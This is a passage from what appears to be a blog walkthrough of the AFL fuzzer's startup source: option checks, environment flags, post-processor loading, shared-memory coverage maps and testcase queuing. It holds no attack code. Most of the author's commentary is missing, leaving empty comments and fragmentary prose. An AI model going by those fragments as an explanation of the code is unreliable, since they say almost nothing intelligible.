mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (skip_deterministic) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (force_deterministic)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;use -S instead of -M -d&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;-S already implies -d&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*x) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*x) &amp;&amp; *x != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *x != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Non-alphanumeric fuzzer ID specified via -S or -M&quot;</span>);</span><br><span class="line"></span><br><span class="line">    x++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strlen</span>(sync_id) &gt; <span class="number">32</span>) <span class="built_in">FATAL</span>(<span class="string">&quot;Fuzzer ID too long&quot;</span>);</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, out_dir, sync_id);</span><br><span class="line"></span><br><span class="line">  sync_dir = out_dir;</span><br><span class="line">  out_dir  = x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!force_deterministic) &#123;</span><br><span class="line">    skip_deterministic = <span class="number">1</span>;</span><br><span class="line">    use_splicing = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzzer input  output </span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(in_dir, out_dir))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Input and output directories can&#x27;t be the same&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// dump mode: dump_mode(deterministic)</span></span><br><span class="line">  <span class="comment">// crash mode: AFL </span></span><br><span class="line">  <span class="comment">// qemu mode: qemu </span></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (crash_mode) <span class="built_in">FATAL</span>(<span class="string">&quot;-C and -n are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (qemu_mode)  <span class="built_in">FATAL</span>(<span class="string">&quot;-Q and -n are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_FORKSRV&quot;</span>))    no_forkserver    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_CPU_RED&quot;</span>))    no_cpu_meter_red = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_ARITH&quot;</span>))      no_arith         = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_SHUFFLE_QUEUE&quot;</span>)) shuffle_queue    = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_FAST_CAL&quot;</span>))      fast_cal         = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// hang </span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>)) &#123;</span><br><span class="line">    hang_tmout = <span class="built_in">atoi</span>(<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HANG_TMOUT&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (!hang_tmout) <span class="built_in">FATAL</span>(<span class="string">&quot;Invalid value of AFL_HANG_TMOUT&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (dumb_mode == <span class="number">2</span> &amp;&amp; no_forkserver)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_DUMB_FORKSRV and AFL_NO_FORKSRV are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;LD_PRELOAD&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;DYLD_INSERT_LIBRARIES&quot;</span>, <span class="built_in">getenv</span>(<span class="string">&quot;AFL_PRELOAD&quot;</span>), <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_LD_PRELOAD&quot;</span>))</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Use AFL_PRELOAD instead of AFL_LD_PRELOAD&quot;</span>);</span><br></pre></td></tr></table></figure><p><code>LD_PRELOAD</code><code>AFL_PRELOAD</code></p><h3 id="cmdline-banner-checktty"><a href="#cmdline-banner-checktty" class="headerlink" title="cmdline&#x2F;banner&#x2F;checktty"></a>cmdline&#x2F;banner&#x2F;checktty</h3><p>buffer</p><p>bannerAFL</p><p>tty</p><ul><li><code>AFL_NO_UI</code><code>not_on_tty = 1</code></li><li>ioctl<code>TIOCGWINSZ</code>tty<code>not_on_tty = 1</code></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">save_cmdline</span>(argc, argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fix_up_banner</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_if_tty</span>();</span><br></pre></td></tr></table></figure><h3 id="bind-cpu-core"><a href="#bind-cpu-core" class="headerlink" title="bind cpu core"></a>bind cpu core</h3><p>CPUfuzzer  cpu  cpu </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">get_core_count</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_AFFINITY</span></span><br><span class="line">  <span class="built_in">bind_to_free_cpu</span>();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* HAVE_AFFINITY */</span></span></span><br><span class="line">  <span class="comment">//   core pattern </span></span><br><span class="line">  <span class="built_in">check_crash_handling</span>();</span><br><span class="line">  <span class="comment">// CPU</span></span><br><span class="line">  <span class="built_in">check_cpu_governor</span>();</span><br></pre></td></tr></table></figure><h3 id="setup-post"><a href="#setup-post" class="headerlink" title="setup post"></a>setup post</h3><p><code>AFL_POST_LIBRARY</code><code>dlopen</code> lib<code>post_handler</code> lib <code>afl_postprocess</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// AFL_POST_LIBRARY</span></span><br><span class="line">  <span class="built_in">setup_post</span>();</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">setup_post</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* dh;</span><br><span class="line">  u8* fn = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_POST_LIBRARY&quot;</span>);</span><br><span class="line">  u32 tlen = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fn) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Loading postprocessor from &#x27;%s&#x27;...&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">  dh = <span class="built_in">dlopen</span>(fn, RTLD_NOW);</span><br><span class="line">  <span class="keyword">if</span> (!dh) <span class="built_in">FATAL</span>(<span class="string">&quot;%s&quot;</span>, <span class="built_in">dlerror</span>());</span><br><span class="line"></span><br><span class="line">  post_handler = <span class="built_in">dlsym</span>(dh, <span class="string">&quot;afl_postprocess&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!post_handler) <span class="built_in">FATAL</span>(<span class="string">&quot;Symbol &#x27;afl_postprocess&#x27; not found.&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do a quick test. It&#x27;s better to segfault now than later =) */</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">post_handler</span>(<span class="string">&quot;hello&quot;</span>, &amp;tlen);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">OKF</span>(<span class="string">&quot;Postprocessor installed successfully.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> fuzzer  AFL  AFL <code>post_handler</code><code>AFL_POST_LIBRARY</code> AFL</p><h3 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup shm"></a>setup shm</h3><p>shm: AFLtupletarget<code>fuzzer</code><code>tuple</code></p><ul><li><code>trace_bits</code> </li><li><code>virgin_bits</code>tuple  </li><li><code>virgin_tmout</code>fuzztimeouttuple  </li><li><code>virgin_crash</code>fuzzcrashtuple</li></ul><p>forkserver<code>__afl_global_area</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Configure shared memory and virgin_bits. This is called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">setup_shm</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u8* shm_str;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!in_bitmap) <span class="built_in">memset</span>(virgin_bits, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(virgin_tmout, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line">  <span class="built_in">memset</span>(virgin_crash, <span class="number">255</span>, MAP_SIZE);</span><br><span class="line"></span><br><span class="line">  shm_id = <span class="built_in">shmget</span>(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shm_id &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmget() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// atexit exit</span></span><br><span class="line">  <span class="built_in">atexit</span>(remove_shm);</span><br><span class="line"></span><br><span class="line">  shm_str = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%d&quot;</span>, shm_id);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If somebody is asking us to fuzz instrumented binaries in dumb mode,</span></span><br><span class="line"><span class="comment">     we don&#x27;t want them to detect instrumentation, since we won&#x27;t be sending</span></span><br><span class="line"><span class="comment">     fork server commands. This should be replaced with better auto-detection</span></span><br><span class="line"><span class="comment">     later on, perhaps? */</span></span><br><span class="line">  <span class="comment">// </span></span><br><span class="line">  <span class="keyword">if</span> (!dumb_mode) <span class="built_in">setenv</span>(SHM_ENV_VAR, shm_str, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(shm_str);</span><br><span class="line"></span><br><span class="line">  trace_bits = <span class="built_in">shmat</span>(shm_id, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (trace_bits == (<span class="type">void</span> *)<span class="number">-1</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;shmat() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>trace_bits</code>0-25556</p><p>568</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line">      [<span class="number">0</span>]           = <span class="number">0</span>, <span class="comment">// 00000000</span></span><br><span class="line">      [<span class="number">1</span>]           = <span class="number">1</span>, <span class="comment">// 00000001</span></span><br><span class="line">      [<span class="number">2</span>]           = <span class="number">2</span>, <span class="comment">// 00000010</span></span><br><span class="line">      [<span class="number">3</span>]           = <span class="number">4</span>, <span class="comment">// 00000100</span></span><br><span class="line">      [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>, <span class="comment">// 00001000</span></span><br><span class="line">      [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,<span class="comment">// 00010000</span></span><br><span class="line">      [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,<span class="comment">// 00100000</span></span><br><span class="line">      [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,<span class="comment">// 01000000</span></span><br><span class="line">      [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span><span class="comment">// 10000000</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 b1, b2;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++) </span><br><span class="line">    <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">      count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] = </span><br><span class="line">        (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">        count_class_lookup8[b2];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="setup-dirs"><a href="#setup-dirs" class="headerlink" title="setup dirs"></a>setup dirs</h3><p></p><ul><li>queue</li><li>crashes: crash</li><li>hangshang</li></ul><h3 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read testcases"></a>read testcases</h3><p> queue </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Read all testcases from the input directory, then queue them for testing.</span></span><br><span class="line"><span class="comment">   Called at startup. */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">read_testcases</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">dirent</span> **nl;</span><br><span class="line">  s32 nl_cnt;</span><br><span class="line">  u32 i;</span><br><span class="line">  u8* fn;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">  fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line">  <span class="comment">// in_dir/queue</span></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ACTF</span>(<span class="string">&quot;Scanning &#x27;%s&#x27;...&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment">     the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment">     difficult to control. */</span></span><br><span class="line">  <span class="comment">// readdir</span></span><br><span class="line">  nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">      <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">           <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">           <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line">    <span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// in_dir/.state/deterministic_done/</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line"><span class="comment">// input</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">    <span class="comment">// input</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="load"><a href="#load" class="headerlink" title="load"></a>load</h3><p>token<code>in_dir/auto_extras/auto_%06u</code><code>maybe_add_auto</code></p><h3 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h3><p> corpus  queue  </p><p><code>mark_as_det_done</code><code>deterministic_done</code></p><h3 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h3><p> -x  dictionary extratokenextras_dirextrasextrassize</p><h3 id="detect-file-args"><a href="#detect-file-args" class="headerlink" title="detect_file_args"></a>detect_file_args</h3><p> <code>@@</code><code>argv[i] = cwd/out_dir/.cur_input</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Detect @@ in args. */</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXP_ST <span class="type">void</span> <span class="title">detect_file_args</span><span class="params">(<span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i = <span class="number">0</span>;</span><br><span class="line">  u8* cwd = <span class="built_in">getcwd</span>(<span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!cwd) <span class="built_in">PFATAL</span>(<span class="string">&quot;getcwd() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (argv[i]) &#123;</span><br><span class="line"></span><br><span class="line">    u8* aa_loc = <span class="built_in">strstr</span>(argv[i], <span class="string">&quot;@@&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (aa_loc) &#123;</span><br><span class="line"></span><br><span class="line">      u8 *aa_subst, 